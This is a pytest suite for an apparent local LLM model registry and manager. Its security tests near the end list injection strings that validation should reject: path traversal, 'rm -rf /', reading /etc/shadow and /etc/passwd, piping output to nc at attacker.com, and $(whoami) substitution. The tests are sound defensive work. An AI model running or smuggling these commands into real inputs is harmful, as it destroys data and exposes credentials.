"""
Test suite for model management and registry.

This module tests model discovery, registration, validation,
and management functionality.
"""

import json
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest

from abov3.models.info import ModelInfo, ModelMetadata, ModelParameters
from abov3.models.manager import ModelManager
from abov3.models.registry import ModelRegistry


class TestModelInfo:
    """Test cases for ModelInfo class."""
    
    def test_model_info_creation(self):
        """Test creating ModelInfo instances."""
        info = ModelInfo(
            name="llama3.2:latest",
            size=4000000000,
            digest="sha256:abc123",
            modified_at="2024-01-01T00:00:00Z"
        )
        
        assert info.name == "llama3.2:latest"
        assert info.size == 4000000000
        assert info.digest == "sha256:abc123"
        assert info.modified_at == "2024-01-01T00:00:00Z"
    
    def test_model_info_from_dict(self):
        """Test creating ModelInfo from dictionary."""
        data = {
            "name": "mistral:latest",
            "size": 3500000000,
            "digest": "sha256:def456",
            "modified_at": "2024-01-02T00:00:00Z",
            "details": {
                "family": "mistral",
                "parameter_size": "7B"
            }
        }
        
        info = ModelInfo.from_dict(data)
        assert info.name == "mistral:latest"
        assert info.size == 3500000000
        assert info.details["family"] == "mistral"
    
    def test_model_info_size_formatting(self):
        """Test human-readable size formatting."""
        info = ModelInfo(
            name="test",
            size=1024,  # 1KB
            digest="",
            modified_at=""
        )
        assert info.size_str == "1.0 KB"
        
        info.size = 1048576  # 1MB
        assert info.size_str == "1.0 MB"
        
        info.size = 1073741824  # 1GB
        assert info.size_str == "1.0 GB"
    
    def test_model_info_comparison(self):
        """Test ModelInfo comparison methods."""
        info1 = ModelInfo(name="model1", size=1000, digest="abc", modified_at="")
        info2 = ModelInfo(name="model2", size=2000, digest="def", modified_at="")
        info3 = ModelInfo(name="model1", size=1000, digest="abc", modified_at="")
        
        assert info1 == info3
        assert info1 != info2
        assert hash(info1) == hash(info3)
    
    def test_model_info_validation(self):
        """Test ModelInfo validation."""
        # Valid info
        info = ModelInfo(
            name="valid:latest",
            size=1000000,
            digest="sha256:valid",
            modified_at="2024-01-01T00:00:00Z"
        )
        assert info.is_valid()
        
        # Invalid name
        with pytest.raises(ValueError):
            ModelInfo(name="", size=1000, digest="abc", modified_at="")
        
        # Invalid size
        with pytest.raises(ValueError):
            ModelInfo(name="test", size=-1, digest="abc", modified_at="")


class TestModelMetadata:
    """Test cases for ModelMetadata class."""
    
    def test_metadata_creation(self):
        """Test creating ModelMetadata instances."""
        metadata = ModelMetadata(
            family="llama",
            parameter_size="7B",
            quantization="Q4_0",
            context_length=4096,
            embedding_dimension=4096
        )
        
        assert metadata.family == "llama"
        assert metadata.parameter_size == "7B"
        assert metadata.quantization == "Q4_0"
        assert metadata.context_length == 4096
    
    def test_metadata_capabilities(self):
        """Test model capability flags."""
        metadata = ModelMetadata(
            family="llama",
            supports_functions=True,
            supports_vision=False,
            supports_tools=True
        )
        
        assert metadata.supports_functions is True
        assert metadata.supports_vision is False
        assert metadata.supports_tools is True
    
    def test_metadata_merge(self):
        """Test merging metadata objects."""
        base = ModelMetadata(family="llama", parameter_size="7B")
        update = ModelMetadata(quantization="Q4_0", context_length=8192)
        
        merged = base.merge(update)
        assert merged.family == "llama"
        assert merged.parameter_size == "7B"
        assert merged.quantization == "Q4_0"
        assert merged.context_length == 8192


class TestModelParameters:
    """Test cases for ModelParameters class."""
    
    def test_default_parameters(self):
        """Test default model parameters."""
        params = ModelParameters()
        
        assert params.temperature == 0.7
        assert params.top_p == 0.9
        assert params.top_k == 40
        assert params.repeat_penalty == 1.1
        assert params.seed is None
    
    def test_parameter_validation(self):
        """Test parameter validation."""
        # Valid parameters
        params = ModelParameters(
            temperature=0.5,
            top_p=0.8,
            top_k=50,
            max_tokens=2048
        )
        assert params.is_valid()
        
        # Invalid temperature
        with pytest.raises(ValueError):
            ModelParameters(temperature=2.5)
        
        # Invalid top_p
        with pytest.raises(ValueError):
            ModelParameters(top_p=1.5)
        
        # Invalid top_k
        with pytest.raises(ValueError):
            ModelParameters(top_k=0)
    
    def test_parameter_override(self):
        """Test parameter override functionality."""
        base = ModelParameters(temperature=0.7, top_p=0.9)
        override = {"temperature": 0.5, "max_tokens": 1024}
        
        new_params = base.override(override)
        assert new_params.temperature == 0.5
        assert new_params.top_p == 0.9
        assert new_params.max_tokens == 1024
    
    def test_parameter_to_dict(self):
        """Test converting parameters to dictionary."""
        params = ModelParameters(
            temperature=0.8,
            top_p=0.85,
            seed=42
        )
        
        param_dict = params.to_dict()
        assert param_dict["temperature"] == 0.8
        assert param_dict["top_p"] == 0.85
        assert param_dict["seed"] == 42
        assert "repeat_penalty" in param_dict


class TestModelRegistry:
    """Test cases for ModelRegistry class."""
    
    @pytest.fixture
    def registry(self):
        """Create a test registry instance."""
        return ModelRegistry()
    
    def test_registry_initialization(self, registry):
        """Test registry initialization."""
        assert len(registry._models) == 0
        assert registry._default_model is None
    
    def test_register_model(self, registry):
        """Test registering a model."""
        model_info = ModelInfo(
            name="test-model:latest",
            size=1000000,
            digest="abc123",
            modified_at="2024-01-01"
        )
        
        registry.register(model_info)
        assert "test-model:latest" in registry._models
        assert registry.get("test-model:latest") == model_info
    
    def test_register_duplicate_model(self, registry):
        """Test registering duplicate models."""
        model_info = ModelInfo(
            name="duplicate:latest",
            size=1000000,
            digest="abc123",
            modified_at="2024-01-01"
        )
        
        registry.register(model_info)
        
        # Registering again should update
        updated_info = ModelInfo(
            name="duplicate:latest",
            size=2000000,
            digest="def456",
            modified_at="2024-01-02"
        )
        registry.register(updated_info)
        
        assert registry.get("duplicate:latest").size == 2000000
    
    def test_unregister_model(self, registry):
        """Test unregistering a model."""
        model_info = ModelInfo(
            name="temp-model:latest",
            size=1000000,
            digest="abc123",
            modified_at="2024-01-01"
        )
        
        registry.register(model_info)
        assert registry.exists("temp-model:latest")
        
        registry.unregister("temp-model:latest")
        assert not registry.exists("temp-model:latest")
    
    def test_list_models(self, registry):
        """Test listing all models."""
        models = [
            ModelInfo(name=f"model{i}:latest", size=i*1000, digest=f"d{i}", modified_at="")
            for i in range(5)
        ]
        
        for model in models:
            registry.register(model)
        
        listed = registry.list()
        assert len(listed) == 5
        assert all(m.name in [model.name for model in models] for m in listed)
    
    def test_search_models(self, registry):
        """Test searching models by pattern."""
        models = [
            ModelInfo(name="llama3.2:latest", size=1000, digest="d1", modified_at=""),
            ModelInfo(name="llama2:latest", size=2000, digest="d2", modified_at=""),
            ModelInfo(name="mistral:latest", size=3000, digest="d3", modified_at=""),
            ModelInfo(name="codellama:latest", size=4000, digest="d4", modified_at="")
        ]
        
        for model in models:
            registry.register(model)
        
        # Search for llama models
        llama_models = registry.search("llama")
        assert len(llama_models) == 3
        assert all("llama" in m.name for m in llama_models)
        
        # Search for latest tags
        latest_models = registry.search(":latest")
        assert len(latest_models) == 4
    
    def test_default_model(self, registry):
        """Test default model functionality."""
        model_info = ModelInfo(
            name="default:latest",
            size=1000000,
            digest="abc123",
            modified_at="2024-01-01"
        )
        
        registry.register(model_info)
        registry.set_default("default:latest")
        
        assert registry.get_default() == model_info
        assert registry._default_model == "default:latest"
    
    def test_model_aliases(self, registry):
        """Test model alias functionality."""
        model_info = ModelInfo(
            name="actual-model:latest",
            size=1000000,
            digest="abc123",
            modified_at="2024-01-01"
        )
        
        registry.register(model_info)
        registry.add_alias("my-alias", "actual-model:latest")
        
        assert registry.get("my-alias") == model_info
        assert registry.resolve_alias("my-alias") == "actual-model:latest"
    
    def test_registry_persistence(self, registry, temp_dir):
        """Test saving and loading registry."""
        models = [
            ModelInfo(name=f"model{i}:latest", size=i*1000, digest=f"d{i}", modified_at="")
            for i in range(3)
        ]
        
        for model in models:
            registry.register(model)
        
        registry.set_default("model1:latest")
        
        # Save registry
        registry_file = temp_dir / "registry.json"
        registry.save(registry_file)
        
        # Load into new registry
        new_registry = ModelRegistry()
        new_registry.load(registry_file)
        
        assert len(new_registry.list()) == 3
        assert new_registry.get_default().name == "model1:latest"


class TestModelManager:
    """Test cases for ModelManager class."""
    
    @pytest.fixture
    def manager(self, mock_ollama_client):
        """Create a test manager instance."""
        return ModelManager(client=mock_ollama_client)
    
    @pytest.mark.asyncio
    async def test_discover_models(self, manager, mock_ollama_client):
        """Test model discovery from Ollama."""
        mock_models = [
            ModelInfo(name="discovered1:latest", size=1000, digest="d1", modified_at=""),
            ModelInfo(name="discovered2:latest", size=2000, digest="d2", modified_at="")
        ]
        
        mock_ollama_client.list_models.return_value = mock_models
        
        discovered = await manager.discover()
        assert len(discovered) == 2
        assert all(m.name in ["discovered1:latest", "discovered2:latest"] for m in discovered)
    
    @pytest.mark.asyncio
    async def test_pull_model(self, manager, mock_ollama_client):
        """Test pulling a model."""
        mock_ollama_client.pull_model.return_value = True
        mock_ollama_client.list_models.return_value = [
            ModelInfo(name="pulled:latest", size=1000, digest="d1", modified_at="")
        ]
        
        result = await manager.pull("new-model:latest")
        assert result is True
        mock_ollama_client.pull_model.assert_called_with("new-model:latest", None)
    
    @pytest.mark.asyncio
    async def test_pull_with_progress(self, manager, mock_ollama_client):
        """Test pulling with progress callback."""
        progress_updates = []
        
        def progress_callback(update):
            progress_updates.append(update)
        
        mock_ollama_client.pull_model.return_value = True
        
        await manager.pull("model:latest", progress_callback)
        mock_ollama_client.pull_model.assert_called_with("model:latest", progress_callback)
    
    @pytest.mark.asyncio
    async def test_delete_model(self, manager, mock_ollama_client):
        """Test deleting a model."""
        mock_ollama_client.delete_model.return_value = True
        
        result = await manager.delete("unwanted:latest")
        assert result is True
        mock_ollama_client.delete_model.assert_called_with("unwanted:latest")
    
    @pytest.mark.asyncio
    async def test_validate_model(self, manager, mock_ollama_client):
        """Test model validation."""
        mock_ollama_client.model_exists.return_value = True
        
        # Test with simple prompt
        mock_ollama_client.generate.return_value = "Test response"
        
        is_valid = await manager.validate("test-model:latest")
        assert is_valid is True
        mock_ollama_client.generate.assert_called()
    
    @pytest.mark.asyncio
    async def test_get_model_info(self, manager, mock_ollama_client):
        """Test getting detailed model information."""
        mock_ollama_client.show.return_value = {
            "license": "MIT",
            "modelfile": "FROM llama2",
            "parameters": "temperature 0.7",
            "template": "{{ .Prompt }}"
        }
        
        info = await manager.get_info("model:latest")
        assert info["license"] == "MIT"
        assert "modelfile" in info
    
    @pytest.mark.asyncio
    async def test_copy_model(self, manager, mock_ollama_client):
        """Test copying a model."""
        mock_ollama_client.copy.return_value = None
        
        await manager.copy("source:latest", "destination:latest")
        mock_ollama_client.copy.assert_called_with("source:latest", "destination:latest")
    
    @pytest.mark.asyncio
    async def test_create_model(self, manager, mock_ollama_client):
        """Test creating a custom model."""
        modelfile = """
        FROM llama2
        PARAMETER temperature 0.8
        SYSTEM You are a helpful assistant.
        """
        
        mock_ollama_client.create.return_value = None
        
        await manager.create("custom:latest", modelfile)
        mock_ollama_client.create.assert_called_with(
            model="custom:latest",
            modelfile=modelfile
        )
    
    @pytest.mark.asyncio
    async def test_model_sync(self, manager, mock_ollama_client):
        """Test syncing models with registry."""
        mock_models = [
            ModelInfo(name="sync1:latest", size=1000, digest="d1", modified_at=""),
            ModelInfo(name="sync2:latest", size=2000, digest="d2", modified_at="")
        ]
        
        mock_ollama_client.list_models.return_value = mock_models
        
        synced = await manager.sync_with_registry()
        assert len(synced) == 2
        
        # Check registry is updated
        assert manager.registry.exists("sync1:latest")
        assert manager.registry.exists("sync2:latest")


class TestModelPerformance:
    """Performance tests for model operations."""
    
    @pytest.mark.performance
    def test_registry_lookup_performance(self):
        """Test registry lookup performance."""
        registry = ModelRegistry()
        
        # Add many models
        for i in range(1000):
            model = ModelInfo(
                name=f"model{i}:latest",
                size=i*1000,
                digest=f"digest{i}",
                modified_at=""
            )
            registry.register(model)
        
        import time
        
        # Test lookup performance
        start = time.perf_counter()
        for i in range(100):
            registry.get(f"model{i}:latest")
        end = time.perf_counter()
        
        avg_time = (end - start) / 100
        assert avg_time < 0.001  # Should be < 1ms per lookup
    
    @pytest.mark.performance
    def test_search_performance(self):
        """Test search performance with many models."""
        registry = ModelRegistry()
        
        # Add models with various patterns
        families = ["llama", "mistral", "claude", "gpt", "falcon"]
        versions = ["latest", "7b", "13b", "70b"]
        
        for family in families:
            for version in versions:
                for i in range(10):
                    model = ModelInfo(
                        name=f"{family}{i}:{version}",
                        size=i*1000000,
                        digest=f"d_{family}_{version}_{i}",
                        modified_at=""
                    )
                    registry.register(model)
        
        import time
        
        # Test search performance
        start = time.perf_counter()
        results = registry.search("llama")
        end = time.perf_counter()
        
        assert len(results) == 40  # 4 versions * 10 instances
        assert (end - start) < 0.1  # Should complete in < 100ms
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_model_operations(self, mock_ollama_client):
        """Test concurrent model operations."""
        manager = ModelManager(client=mock_ollama_client)
        
        mock_ollama_client.list_models.return_value = [
            ModelInfo(name=f"model{i}", size=1000, digest=f"d{i}", modified_at="")
            for i in range(10)
        ]
        
        import asyncio
        
        # Run multiple operations concurrently
        tasks = [
            manager.discover(),
            manager.discover(),
            manager.discover()
        ]
        
        results = await asyncio.gather(*tasks)
        assert all(len(r) == 10 for r in results)


class TestModelSecurity:
    """Security tests for model operations."""
    
    @pytest.mark.security
    def test_model_name_sanitization(self):
        """Test model name sanitization."""
        registry = ModelRegistry()
        
        # Test potentially malicious model names
        malicious_names = [
            "../../../etc/passwd",
            "model:latest; rm -rf /",
            "model:latest && cat /etc/shadow",
            "model:latest | nc attacker.com 1234",
            "model:$(whoami)",
            "model:`id`"
        ]
        
        for name in malicious_names:
            with pytest.raises(ValueError):
                model = ModelInfo(
                    name=name,
                    size=1000,
                    digest="safe",
                    modified_at=""
                )
                registry.register(model)
    
    @pytest.mark.security
    def test_modelfile_injection(self):
        """Test modelfile content validation."""
        manager = ModelManager(client=Mock())
        
        # Test potentially malicious modelfile content
        malicious_modelfiles = [
            "FROM llama2\nSYSTEM $(cat /etc/passwd)",
            "FROM llama2\nSYSTEM `rm -rf /`",
            "FROM ../../etc/passwd",
            "FROM llama2\nPARAMETER exec 'malicious command'"
        ]
        
        for modelfile in malicious_modelfiles:
            with pytest.raises(ValueError):
                manager.validate_modelfile(modelfile)
    
    @pytest.mark.security
    def test_model_size_limits(self):
        """Test model size validation."""
        registry = ModelRegistry()
        
        # Test extremely large model size
        with pytest.raises(ValueError):
            model = ModelInfo(
                name="huge:latest",
                size=10**15,  # 1 PB
                digest="abc",
                modified_at=""
            )
            registry.register(model)
    
    @pytest.mark.security
    def test_registry_file_permissions(self, temp_dir):
        """Test registry file permissions."""
        registry = ModelRegistry()
        registry_file = temp_dir / "secure_registry.json"
        
        model = ModelInfo(
            name="secure:latest",
            size=1000,
            digest="abc",
            modified_at=""
        )
        registry.register(model)
        registry.save(registry_file)
        
        # Check file permissions (Unix only)
        import os
        if os.name != 'nt':
            stat_info = os.stat(registry_file)
            # File should not be world-readable
            assert (stat_info.st_mode & 0o004) == 0